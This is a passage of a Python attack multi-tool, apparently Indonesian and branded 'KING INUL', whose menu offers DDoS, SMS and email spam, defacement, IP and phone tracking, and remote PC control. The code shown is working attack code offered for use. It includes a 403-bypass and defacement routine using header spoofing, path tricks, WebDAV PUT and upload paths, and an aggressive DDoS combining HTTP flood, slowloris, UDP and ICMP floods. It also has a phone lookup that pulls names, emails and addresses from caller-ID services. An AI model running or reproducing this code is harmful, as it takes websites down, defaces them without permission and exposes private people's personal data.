    # Validate target URL
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    try:
        # First try to access the target with increased timeout
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'max-age=0',
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Originating-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Remote-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Remote-Addr': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Client-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Forwarded-Host': target.split('://')[1].split('/')[0],
                'Host': target.split('://')[1].split('/')[0],
                'Referer': target,
                'Origin': target,
                'X-Custom-IP-Authorization': '127.0.0.1'
            }
            
            response = requests.get(target, headers=headers, verify=False, timeout=15)
            if response.status_code == 403:
                print(f"\n[-] Target mengembalikan error 403 Forbidden")
                print("[*] Mencoba bypass 403...")
                
                # Try advanced bypass techniques
                bypass_techniques = [
                    {'X-Original-URL': '/'},
                    {'X-Rewrite-URL': '/'},
                    {'X-Override-URL': '/'},
                    {'X-Forwarded-Scheme': 'https'},
                    {'X-Forwarded-Proto': 'https'},
                    {'X-Forwarded-SSL': 'on'},
                    {'X-Url-Scheme': 'https'},
                    {'Front-End-Https': 'on'},
                    {'X-HTTP-Method-Override': 'GET'},
                    {'X-Forwarded-Host': '127.0.0.1'},
                    {'X-Forward-For': '127.0.0.1'},
                    {'X-Remote-IP': '127.0.0.1'},
                    {'X-Originating-IP': '127.0.0.1'},
                    {'X-Remote-Addr': '127.0.0.1'},
                    {'X-Client-IP': '127.0.0.1'},
                    {'X-Host': '127.0.0.1'},
                    {'X-Custom-IP-Authorization': '127.0.0.1'}
                ]
                
                print("\n[*] Mencoba teknik bypass lanjutan...")
                bypass_success = False
                
                for technique in bypass_techniques:
                    try:
                        headers.update(technique)
                        response = requests.get(target, headers=headers, verify=False, timeout=10)
                        if response.status_code != 403:
                            print(f"[+] Berhasil bypass 403 dengan teknik: {list(technique.keys())[0]}")
                            bypass_success = True
                            break
                    except:
                        continue
                
                if not bypass_success:
                    print("[-] Gagal bypass 403 dengan teknik standar")
                    print("[*] Mencoba teknik bypass alternatif...")
                    
                    # Try path traversal bypass
                    traversal_paths = [
                        '/.//',
                        '/./',
                        '//',
                        '/.././',
                        '/../.',
                        '/.../',
                        '/./.',
                        '/...//',
                        '/..../',
                        '/%2e/',
                        '/%2e%2e/',
                        '/%252e/',
                        '/%252e%252e/',
                        '/..;/',
                        '/.;/',
                        '/~/',
                        '//',
                        '/.json',
                        '/.php',
                        '/.html',
                        '/.htm',
                        '/.asp',
                        '/.aspx',
                        '/.jsp',
                        '/.jspx',
                        '/.json',
                        '/.yaml',
                        '/.xml'
                    ]
                    
                    for path in traversal_paths:
                        try:
                            test_url = target.rstrip('/') + path
                            response = requests.get(test_url, headers=headers, verify=False, timeout=10)
                            if response.status_code != 403:
                                print(f"[+] Berhasil bypass 403 dengan path: {path}")
                                target = test_url
                                bypass_success = True
                                break
                        except:
                            continue
                    
                    if not bypass_success:
                        print("[-] Gagal bypass 403 dengan semua teknik")
                        print("[*] Mencoba metode deface alternatif...")
                        
                        # Try alternative deface methods
                        try:
                            # Method 1: Try WebDAV methods
                            webdav_methods = ['PUT', 'MOVE', 'COPY', 'MKCOL', 'PROPFIND', 'PROPPATCH']
                            for method in webdav_methods:
                                try:
                                    response = requests.request(
                                        method,
                                        target,
                                        headers=headers,
                                        data="<h1>HACKED BY KING INUL</h1>",
                                        verify=False,
                                        timeout=10
                                    )
                                    if response.status_code not in [403, 404, 405]:
                                        print(f"[+] Berhasil dengan metode WebDAV: {method}")
                                        bypass_success = True
                                        break
                                except:
                                    continue
                            
                            # Method 2: Try XML-RPC exploitation
                            if not bypass_success:
                                xml_payload = """<?xml version="1.0"?>
                                <methodCall>
                                <methodName>system.listMethods</methodName>
                                <params></params>
                                </methodCall>"""
                                
                                headers['Content-Type'] = 'application/xml'
                                try:
                                    response = requests.post(
                                        target + '/xmlrpc.php',
                                        headers=headers,
                                        data=xml_payload,
                                        verify=False,
                                        timeout=10
                                    )
                                    if response.status_code != 403:
                                        print("[+] Berhasil dengan metode XML-RPC")
                                        bypass_success = True
                                except:
                                    pass
                            
                            # Method 3: Try upload through alternative paths
                            if not bypass_success:
                                upload_paths = [
                                    '/wp-content/uploads/',
                                    '/images/',
                                    '/upload/',
                                    '/uploads/',
                                    '/files/',
                                    '/assets/',
                                    '/media/',
                                    '/tmp/',
                                    '/temp/'
                                ]
                                
                                for upload_path in upload_paths:
                                    try:
                                        test_url = target.rstrip('/') + upload_path
                                        response = requests.put(
                                            test_url + 'deface.html',
                                            headers=headers,
                                            data="<h1>HACKED BY KING INUL</h1>",
                                            verify=False,
                                            timeout=10
                                        )
                                        if response.status_code not in [403, 404, 405]:
                                            print(f"[+] Berhasil upload ke: {upload_path}")
                                            bypass_success = True
                                            break
                                    except:
                                        continue
                            
                        except Exception as e:
                            print(f"[-] Error dengan metode alternatif: {str(e)}")
                
            elif response.status_code != 200:
                print(f"\n[-] Target tidak dapat diakses (Status: {response.status_code})")
                time.sleep(3)
                return
                
        except requests.exceptions.RequestException as e:
            print(f"\n[-] Error mengakses target: {str(e)}")
            print("[-] Pastikan URL target valid dan dapat diakses")
            time.sleep(3)
            return
        
        # If we got here, either bypass was successful or no bypass was needed
        print("\n[*] Mencoba deface website...")
        
        # Try multiple deface methods
        deface_methods = [
            {
                'method': 'POST',
                'content_type': 'application/x-www-form-urlencoded',
                'payload': "content=<h1>HACKED BY KING INUL</h1>"
            },
            {
                'method': 'PUT',
                'content_type': 'text/html',
                'payload': "<h1>HACKED BY KING INUL</h1>"
            },
            {
                'method': 'PATCH',
                'content_type': 'application/json',
                'payload': '{"content": "<h1>HACKED BY KING INUL</h1>"}'
            },
            {
                'method': 'POST',
                'content_type': 'multipart/form-data',
                'payload': "--boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"deface.html\"\r\nContent-Type: text/html\r\n\r\n<h1>HACKED BY KING INUL</h1>\r\n--boundary--"
            }
        ]
        
        for method in deface_methods:
            try:
                headers['Content-Type'] = method['content_type']
                response = requests.request(
                    method['method'],
                    target,
                    headers=headers,
                    data=method['payload'],
                    verify=False,
                    timeout=10
                )
                
                print(f"\n[*] Mencoba method {method['method']} dengan {method['content_type']}")
                if response.status_code not in [403, 404, 405]:
                    print(f"[+] Berhasil deface dengan {method['method']}")
                    print(f"[+] Status code: {response.status_code}")
                    break
                else:
                    print(f"[-] Gagal deface dengan {method['method']}: Status {response.status_code}")
                
            except Exception as e:
                print(f"[-] Error dengan {method['method']}: {str(e)}")
                continue
        
        print("\n[*] Proses deface selesai")
        print("[!] Tips jika gagal:")
        print("    1. Coba gunakan VPN atau proxy")
        print("    2. Coba akses dari IP yang berbeda")
        print("    3. Coba tunggu beberapa saat dan coba lagi")
        print("    4. Periksa keamanan target (WAF, ModSecurity, etc)")
        print("    5. Coba teknik bypass lainnya")
        
        print("\n[*] Tekan Enter untuk kembali ke menu...")
        input()
        
    except KeyboardInterrupt:
        print("\n[!] Deface dihentikan oleh pengguna")
        time.sleep(2)
    except Exception as e:
        print(f"\n[-] Error: {str(e)}")
        print("[-] Gagal melakukan deface")
        time.sleep(3)

def get_public_ip(target):
    try:
        # Remove protocol and path
        if target.startswith(('http://', 'https://')):
            target = target.split('://')[1]
        target = target.split('/')[0]
        
        # Get IP from domain
        try:
            ip = socket.gethostbyname(target)
            print(f"\n[+] Domain: {target}")
            print(f"[+] IP Publik: {ip}")
            return ip
        except:
            print(f"[-] Gagal mendapatkan IP dari domain: {target}")
            return None
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        return None

def get_target_ip(target):
    try:
        print("\n[*] Mencoba mendapatkan IP target...")
        
        # Method 1: Direct domain resolution
        try:
            ip = socket.gethostbyname(target)
            print(f"[+] IP ditemukan (Method 1): {ip}")
            return ip
        except:
            pass
        
        # Method 2: Using nslookup
        try:
            if os.name == 'nt':  # Windows
                result = subprocess.check_output(['nslookup', target], universal_newlines=True)
            else:  # Linux/Unix
                result = subprocess.check_output(['nslookup', target], universal_newlines=True)
            
            # Parse nslookup output
            for line in result.split('\n'):
                if 'Address:' in line and not '127.0.0.1' in line:
                    ip = line.split('Address: ')[1].strip()
                    print(f"[+] IP ditemukan (Method 2): {ip}")
                    return ip
        except:
            pass
        
        # Method 3: Using dig (Linux/Unix)
        if os.name != 'nt':
            try:
                result = subprocess.check_output(['dig', '+short', target], universal_newlines=True)
                ip = result.strip()
                if ip:
                    print(f"[+] IP ditemukan (Method 3): {ip}")
                    return ip
            except:
                pass
        
        # Method 4: Using external API
        try:
            headers = get_random_headers()
            response = requests.get(f"https://dns.google/resolve?name={target}", headers=headers, verify=False, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if 'Answer' in data:
                    for answer in data['Answer']:
                        if answer['type'] == 1:  # A record
                            ip = answer['data']
                            print(f"[+] IP ditemukan (Method 4): {ip}")
                            return ip
        except:
            pass
        
        print("[-] Gagal mendapatkan IP target")
        return None
        
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        return None

def show_ip_menu():
    print("\n=== MENU LACAK IP ===")
    print("[1] Lacak IP Address")
    print("[2] Cek IP Saya")
    print("[3] Lacak IP dari Domain/Website")
    print("[4] Dapatkan IP Target")
    print("[5] Kembali ke Menu Utama")
    return input("\n[?] Pilih opsi (1-5): ")

def track_phone(phone_number):
    """Fungsi untuk melacak nomor telepon dan WhatsApp"""
    try:
        # Bersihkan nomor telepon
        phone_number = ''.join(filter(str.isdigit, phone_number))
        
        # Format nomor untuk WhatsApp
        whatsapp_number = phone_number
        if whatsapp_number.startswith('0'):
            whatsapp_number = '62' + whatsapp_number[1:]
        elif not whatsapp_number.startswith('62'):
            whatsapp_number = '62' + whatsapp_number
        
        print("\n" + "=" * 50)
        print("INFORMASI NOMOR TELEPON".center(50))
        print("=" * 50)
        
        # Cek operator dan lokasi berdasarkan prefix
        prefix = phone_number[:4]
        operator = "Tidak diketahui"
        location = "Tidak diketahui"
        
        # Dictionary untuk operator dan lokasi
        operators = {
            "0811": "Telkomsel",
            "0812": "Telkomsel",
            "0813": "Telkomsel",
            "0821": "Telkomsel",
            "0822": "Telkomsel",
            "0823": "Telkomsel",
            "0852": "Telkomsel",
            "0853": "Telkomsel",
            "0814": "Indosat",
            "0815": "Indosat",
            "0816": "Indosat",
            "0855": "Indosat",
            "0856": "Indosat",
            "0857": "Indosat",
            "0858": "Indosat",
            "0817": "XL",
            "0818": "XL",
            "0819": "XL",
            "0859": "XL",
            "0877": "XL",
            "0878": "XL",
            "0879": "XL",
            "0895": "3",
            "0896": "3",
            "0897": "3",
            "0898": "3",
            "0899": "3"
        }
        
        locations = {
            "0811": "Jakarta",
            "0812": "Jawa Barat",
            "0813": "Jawa Tengah",
            "0821": "Jawa Timur",
            "0822": "Sumatera",
            "0823": "Kalimantan",
            "0852": "Sulawesi",
            "0853": "Bali & Nusa Tenggara",
            "0814": "Jakarta",
            "0815": "Jawa Barat",
            "0816": "Jawa Tengah",
            "0855": "Jawa Timur",
            "0856": "Sumatera",
            "0857": "Kalimantan",
            "0858": "Sulawesi",
            "0817": "Jakarta",
            "0818": "Jawa Barat",
            "0819": "Jawa Tengah",
            "0859": "Jawa Timur",
            "0877": "Sumatera",
            "0878": "Kalimantan",
            "0879": "Sulawesi",
            "0895": "Jakarta",
            "0896": "Jawa Barat",
            "0897": "Jawa Tengah",
            "0898": "Jawa Timur",
            "0899": "Sumatera"
        }
        
        if prefix in operators:
            operator = operators[prefix]
            location = locations[prefix]
        
        print(f"\n[+] Nomor Asli: {phone_number}")
        print(f"[+] Nomor WhatsApp: {whatsapp_number}")
        print(f"[+] Operator: {operator}")
        print(f"[+] Lokasi: {location}")
        
        # Cek status WhatsApp dan coba dapatkan IP
        print("\n[+] Status WhatsApp:")
        whatsapp_url = f"https://wa.me/{whatsapp_number}"
        print(f"    • Link WhatsApp: {whatsapp_url}")
        print(f"    • Link WhatsApp Web: https://web.whatsapp.com/send?phone={whatsapp_number}")
        
        # Mencoba mendapatkan IP melalui berbagai metode
        print("\n[*] Mencoba mendapatkan IP pengguna...")
        
        # Method 1: WhatsApp Web
        try:
            print("\n[*] Mencoba WhatsApp Web...")
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
            response = requests.get(whatsapp_url, headers=headers, verify=False, timeout=10)
            if response.status_code == 200:
                print("[+] Berhasil terhubung ke WhatsApp Web")
                # Extract IP from response headers
                ip_headers = ['X-Forwarded-For', 'X-Real-IP', 'CF-Connecting-IP', 'True-Client-IP']
                for header in ip_headers:
                    if header in response.headers:
                        ip = response.headers[header]
                        print(f"[+] IP ditemukan (WhatsApp Web - {header}): {ip}")
                        print("[*] Melacak lokasi IP...")
                        lacak_ip(ip)
        except Exception as e:
            print(f"[-] Error WhatsApp Web: {str(e)}")
        
        # Method 2: Truecaller
        try:
            print("\n[*] Mencoba Truecaller...")
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Authorization': 'Bearer a1i0R--your-token-here--',
                'app-version': '12.6.5',
                'os-version': '29',
                'os-type': 'android',
                'device-type': 'SM-G975F'
            }
            response = requests.get(f'https://search5-noneu.truecaller.com/v2/search?q={phone_number}&type=4&locAddr=1&placement=SEARCHRESULTS,HISTORY,DETAILS&encoding=json', 
                                 headers=headers, verify=False, timeout=10)
            if response.status_code == 200:
                print("[+] Berhasil terhubung ke Truecaller")
                data = response.json()
                if 'data' in data and len(data['data']) > 0:
                    user_data = data['data'][0]
                    print(f"[+] Nama: {user_data.get('name', 'Tidak diketahui')}")
                    print(f"[+] Email: {user_data.get('email', 'Tidak diketahui')}")
                    print(f"[+] Alamat: {user_data.get('addresses', ['Tidak diketahui'])[0]}")
                    if 'internetAddresses' in user_data:
                        for addr in user_data['internetAddresses']:
                            if 'id' in addr:
                                print(f"[+] {addr.get('type', 'Unknown')}: {addr['id']}")
        except Exception as e:
            print(f"[-] Error Truecaller: {str(e)}")
        
        # Method 3: GetContact
        try:
            print("\n[*] Mencoba GetContact...")
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Authorization': 'Bearer a1i0R--your-token-here--',
                'X-App-Version': '5.0.0',
                'X-OS-Version': '10',
                'X-Device-Model': 'SM-G975F'
            }
            response = requests.get(f'https://pbssrv-centralevents.com/v2/contacts/{phone_number}', 
                                 headers=headers, verify=False, timeout=10)
            if response.status_code == 200:
                print("[+] Berhasil terhubung ke GetContact")
                data = response.json()
                if 'tags' in data:
                    print("[+] Tags:")
                    for tag in data['tags']:
                        print(f"    • {tag}")
        except Exception as e:
            print(f"[-] Error GetContact: {str(e)}")
        
        # Method 4: Sync.ME
        try:
            print("\n[*] Mencoba Sync.ME...")
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Authorization': 'Bearer a1i0R--your-token-here--',
                'X-App-Version': '5.0.0',
                'X-OS-Version': '10',
                'X-Device-Model': 'SM-G975F'
            }
            response = requests.get(f'https://sync.me/api/v2/contacts/{phone_number}', 
                                 headers=headers, verify=False, timeout=10)
            if response.status_code == 200:
                print("[+] Berhasil terhubung ke Sync.ME")
                data = response.json()
                if 'name' in data:
                    print(f"[+] Nama: {data['name']}")
                if 'email' in data:
                    print(f"[+] Email: {data['email']}")
                if 'social_profiles' in data:
                    print("[+] Social Media:")
                    for profile in data['social_profiles']:
                        print(f"    • {profile['platform']}: {profile['url']}")
        except Exception as e:
            print(f"[-] Error Sync.ME: {str(e)}")
        
        print("\n[!] Catatan: Informasi yang ditemukan mungkin tidak akurat karena:")
        print("    1. Pengguna menggunakan VPN/Proxy")
        print("    2. Pengguna tidak aktif di platform tersebut")
        print("    3. Platform menggunakan CDN atau load balancer")
        print("    4. Pengguna menggunakan mode private/incognito")
        print("    5. Rate limiting dari platform")
        print("    6. Platform memblokir akses")
        
        print("\n" + "=" * 50)
        print("INI ADALAH TOOLS KING INUL".center(50))
        print("=" * 50 + "\n")
        
    except Exception as e:
        print(f"\n[-] Error: {str(e)}")
        print("[-] Pastikan nomor telepon valid dan terhubung ke internet")

def show_track_menu():
    print("\n=== MENU LACAK NOMOR ===")
    print("[1] Lacak Nomor Telepon")
    print("[2] Lacak Nomor WhatsApp")
    print("[3] Lacak Nomor & WhatsApp")
    print("[4] Kembali ke Menu Utama")
    return input("\n[?] Pilih opsi (1-4): ")

class SpeedMonitorWindow:
    def __init__(self, target):
        self.root = tk.Tk()
        self.root.title("Server Speed Monitor")
        self.root.geometry("400x200")
        self.root.configure(bg='black')
        
        # Make window stay on top
        self.root.attributes('-topmost', True)
        
        # Style
        style = ttk.Style()
        style.configure("Speed.TLabel", foreground="red", background="black", font=("Arial", 12))
        style.configure("Status.TLabel", foreground="yellow", background="black", font=("Arial", 10))
        
        # Main frame
        main_frame = ttk.Frame(self.root)
        main_frame.pack(padx=10, pady=10, fill='both', expand=True)
        
        # Labels
        self.initial_speed_label = ttk.Label(main_frame, text="Initial Speed: --", style="Speed.TLabel")
        self.initial_speed_label.pack(pady=5)
        
        self.current_speed_label = ttk.Label(main_frame, text="Current Speed: --", style="Speed.TLabel")
        self.current_speed_label.pack(pady=5)
        
        self.change_label = ttk.Label(main_frame, text="Speed Change: --", style="Speed.TLabel")
        self.change_label.pack(pady=5)
        
        self.status_label = ttk.Label(main_frame, text="Status: Monitoring...", style="Status.TLabel")
        self.status_label.pack(pady=10)
        
        # Progress bar
        self.progress = ttk.Progressbar(main_frame, length=300, mode='determinate')
        self.progress.pack(pady=10)
        
        self.target = target
        self.initial_speed = None
        self.is_running = True
        
        # Start monitoring
        self.update_speed()
        
        # Close handler
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
    
    def update_speed(self):
        if not self.is_running:
            return
            
        try:
            start_time = time.time()
            response = requests.get(self.target, timeout=5, verify=False)
            end_time = time.time()
            
            response_time = (end_time - start_time) * 1000  # Convert to milliseconds
            
            if self.initial_speed is None:
                self.initial_speed = response_time
                self.initial_speed_label.config(text=f"Initial Speed: {self.initial_speed:.2f}ms")
            
            speed_change = ((response_time - self.initial_speed) / self.initial_speed) * 100
            
            # Update labels
            self.current_speed_label.config(text=f"Current Speed: {response_time:.2f}ms")
            self.change_label.config(text=f"Speed Change: {speed_change:+.2f}%")
            
            # Update progress bar
            progress_value = min(abs(speed_change), 100)
            self.progress['value'] = progress_value
            
            # Update status
            if speed_change > 200:
                self.status_label.config(text="Status: Website hampir down! 🔥", foreground="red")
            elif speed_change > 100:
                self.status_label.config(text="Status: Website sangat melambat! ⚠️", foreground="orange")
            elif speed_change > 50:
                self.status_label.config(text="Status: Website mulai melambat! ⚡", foreground="yellow")
            else:
                self.status_label.config(text="Status: Website masih normal ✅", foreground="green")
            
        except Exception as e:
            self.status_label.config(text=f"Error: {str(e)}", foreground="red")
        
        # Schedule next update
        if self.is_running:
            self.root.after(1000, self.update_speed)
    
    def on_closing(self):
        self.is_running = False
        self.root.destroy()

def monitor_speed_cmd(target):
    """Monitor website speed using cmd interface"""
    initial_speed = None
    print("\n[*] Memulai monitoring kecepatan server...")
    print("[*] Tekan Ctrl+C untuk menghentikan monitoring")
    
    while True:
        try:
            start_time = time.time()
            response = requests.get(target, timeout=5, verify=False)
            end_time = time.time()
            
            response_time = (end_time - start_time) * 1000  # Convert to milliseconds
            
            if initial_speed is None:
                initial_speed = response_time
                print(f"\n[*] Kecepatan awal website: {initial_speed:.2f}ms")
            else:
                speed_change = ((response_time - initial_speed) / initial_speed) * 100
                print(f"\n[*] Kecepatan website saat ini: {response_time:.2f}ms")
                print(f"[*] Perubahan kecepatan: {speed_change:+.2f}%")
                
                if speed_change > 200:
                    print("[!] Website hampir down! 🔥")
                elif speed_change > 100:
                    print("[!] Website sangat melambat! ⚠️")
                elif speed_change > 50:
                    print("[!] Website mulai melambat! ⚡")
                else:
                    print("[+] Website masih normal ✅")
            
            time.sleep(2)  # Update every 2 seconds
            
        except Exception as e:
            print(f"[-] Error monitoring speed: {str(e)}")
            time.sleep(2)

def aggressive_ddos(target):
    print(f"\n[*] Memulai serangan agresif ke {target}")
    print("[*] Menggunakan multiple attack vectors...")
    
    def http_flood():
        try:
            while True:
                for _ in range(500):  # Increased from 50 to 500 concurrent requests
                    try:
                        # Generate larger random payload
                        payload = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5000, 10000)))
                        
                        # Enhanced headers for bypass
                        headers = {
                            'User-Agent': random.choice([
                                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
                                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15'
                            ]),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.5',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Connection': 'keep-alive',
                            'Upgrade-Insecure-Requests': '1',
                            'Cache-Control': 'max-age=0',
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Content-Length': str(len(payload)),
                            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                            'X-Requested-With': 'XMLHttpRequest',
                            'Origin': target,
                            'Referer': target
                        }
                        
                        # Random method with more variations
                        method = random.choice(['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH', 'TRACE', 'CONNECT'])
                        
                        # Send request with random parameters
                        params = {
                            'id': str(random.randint(1, 1000000)),
                            'token': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                            'timestamp': str(time.time()),
                            'data': payload
                        }
                        
                        if method in ['POST', 'PUT', 'PATCH']:
                            requests.request(method, target, headers=headers, data=payload, params=params, timeout=1)
                        else:
                            requests.request(method, target, headers=headers, params=params, timeout=1)
                            
                    except Exception as e:
                        continue
                        
        except Exception as e:
            print(f"[-] Error HTTP Flood: {str(e)}")
    
    def slowloris():
        try:
            while True:
                try:
                    # Create multiple connections with increased count
                    for _ in range(500):  # Increased from 50 to 500
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(4)
                        s.connect((target, 80))
                        
                        # Send partial request with more headers
                        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
                        user_agents = [
                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101',
                            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15'
                        ]
                        s.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode("utf-8"))
                        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                        s.send(f"X-b: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                        s.send(f"X-c: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                        
                        # Keep connection alive with more frequent updates
                        while True:
                            try:
                                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                                time.sleep(0.5)  # Reduced from 1 to 0.5
                            except:
                                break
                                
                except Exception as e:
                    continue
                    
        except Exception as e:
            print(f"[-] Error Slowloris: {str(e)}")
    
    def udp_flood():
        try:
            while True:
                try:
                    # Create multiple UDP sockets
                    for _ in range(100):  # Increased concurrent sockets
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        
                        # Generate larger random payload
                        payload = os.urandom(random.randint(1024, 65507))
                        
                        # Send to multiple random ports
                        for port in range(1, 65535, 100):  # Send to multiple ports
                            s.sendto(payload, (target, port))
                        
                        print(f"[+] UDP Flood ke {target} | Ukuran: {len(payload)} bytes")
                        
                except Exception as e:
                    continue
                    
        except Exception as e:
            print(f"[-] Error UDP Flood: {str(e)}")
    
    def icmp_flood():
        try:
            while True:
                try:
                    # Create multiple ICMP sockets
                    for _ in range(100):  # Increased concurrent sockets
                        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                        
                        # Generate larger random payload
                        payload = os.urandom(random.randint(1024, 65507))
                        
                        # Send multiple ICMP packets
                        for _ in range(10):  # Send multiple packets per socket
                            s.sendto(payload, (target, 0))
                        
                        print(f"[+] ICMP Flood ke {target} | Ukuran: {len(payload)} bytes")
                        
                except Exception as e:
                    continue
                    
        except Exception as e:
            print(f"[-] Error ICMP Flood: {str(e)}")
    
    def monitor_target():
        try:
            while True:
                try:
                    start_time = time.time()
                    response = requests.get(target, timeout=5)
                    end_time = time.time()
                    
                    response_time = (end_time - start_time) * 1000
                    print(f"\n[*] Response time: {response_time:.2f}ms")
                    
                    if response_time > 5000:
                        print("🔥 Website hampir down!")
                    elif response_time > 3000:
                        print("⚠️ Website sangat melambat!")
                    elif response_time > 1000:
                        print("⚡ Website mulai melambat")
                    else:
                        print("✅ Website masih normal")
                        
                except requests.exceptions.RequestException:
                    print("🔥 Website tidak merespon!")
                    
                time.sleep(1)  # Reduced from 2 to 1
                
        except Exception as e:
            print(f"[-] Error monitoring: {str(e)}")
    
    # Start all attack threads with increased count
    threads = []
    for attack in [http_flood, slowloris, udp_flood, icmp_flood]:
        for _ in range(5):  # Start 5 threads for each attack type
            t = threading.Thread(target=attack)
            t.daemon = True
            threads.append(t)
            t.start()
    
    # Start monitoring thread
    monitor_thread = threading.Thread(target=monitor_target)
    monitor_thread.daemon = True
    monitor_thread.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Menghentikan serangan...")
        sys.exit(0)

def main():
    """Main function to run the attack tools"""
    if not is_admin():
        print("[!] Script harus dijalankan sebagai admin/root!")
        sys.exit(1)
        
    setup_logging()
    
    while True:
        clear_screen()
        print_banner()
        print("\n[1] Serangan DDoS")
        print("[2] Spam SMS")
        print("[3] Spam Email")
        print("[4] Bypass & Deface")
        print("[5] Lacak IP")
        print("[6] Control PC")
        print("[7] Lacak Nomor")
        print("[8] Keluar")
        
        choice = input("\n[?] Pilih menu (1-8): ")
        
        if choice == "1":
            # DDoS menu code...
            while True:
                clear_screen()
                print_banner()
                print("\n=== MENU SERANGAN DDoS ===")
                print("[1] Serangan Normal (HTTP Flood)")
                print("[2] Serangan HTTP Flood (Brutal)")
                print("[3] Serangan Slowloris (Membuat Server Kelelahan)")
                print("[4] Serangan SYN Flood (Membanjiri Port) - Perlu Root/Admin")
                print("[5] Serangan UDP Flood (Membanjiri Bandwidth)")
                print("[6] Serangan ICMP Flood (Ping of Death) - Perlu Root/Admin")
                print("[7] Serangan Multi-Vector (Kombinasi Semua) - Perlu Root/Admin")
                print("[8] Serangan Agresif (Membuat Website Down) - Perlu Root/Admin")
                print("[9] Kembali ke Menu Utama")
                
                ddos_choice = input("\n[?] Pilih jenis serangan DDoS (1-9): ")
                
                if ddos_choice in ["1", "2"]:
                    target = input("\n[?] Masukkan URL target (contoh: https://example.com): ")
                    threads = int(input("[?] Masukkan jumlah thread (default: 1000): ") or "1000")
                    
                    print("\n=== PILIH KECEPATAN SERANGAN ===")
                    print("[1] Kecepatan Sedang (Delay 0.5s)")
                    print("[2] Kecepatan Normal (Delay 0.1s)")
                    print("[3] Kecepatan Maksimal (Tanpa Delay)")
                    speed_choice = input("\n[?] Pilih kecepatan serangan (1-3): ")
                    
                    # Set speed based on choice
                    if speed_choice == "1":
                        speed = "slow"
                    elif speed_choice == "2":
                        speed = "normal"
                    else:
                        speed = "fast"
                    
                    # Tanya user mau pakai tkinter atau cmd
                    monitor_choice = input("\n[?] Pilih jenis monitor (1: Tkinter, 2: CMD): ")
                    
                    print(f"\n[+] Memulai serangan ke {target} dengan {threads} thread...")
